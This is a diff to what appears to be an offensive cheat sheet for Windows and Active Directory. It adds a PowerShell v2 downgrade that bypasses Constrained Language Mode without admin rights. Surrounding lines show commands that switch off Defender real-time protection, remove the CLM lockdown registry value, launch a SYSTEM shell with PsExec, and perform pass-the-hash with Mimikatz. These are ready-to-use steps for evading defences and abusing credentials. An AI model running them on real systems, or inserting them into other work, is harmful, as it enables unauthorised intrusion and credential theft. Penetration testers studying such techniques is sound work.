@@ -122,10 +122,14 @@ To bypass AMSI and Defender, there is a possibility to turn them off with Local 
 Set-MpPreference -DisableIOAVProtection $true
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
-### Bypass CLM
+### Bypass CLM with Local Admin
 ```
 Remove-ItemProperty -path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -name __PSLockdownPolicy
 PsExec64.exe -i -s C:\Users\fcastle\Desktop\powershell.exe
+```
+### Bypass CLM without Local Admin
+```
+Powershell -version 2
 ```
 ### Check Applocker RuleCollections
 ```
@@ -155,7 +159,7 @@ Invoke-Mimikatz -command "sekurlsa::pth /user:Administrator /domain:MARVEL /ntlm
 ```
 Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq $userName}
 ```
-### Looking for hiddenb GPO:
+### Looking for hidden GPO:
 ```
 PS>(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] Domain Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}
 ```
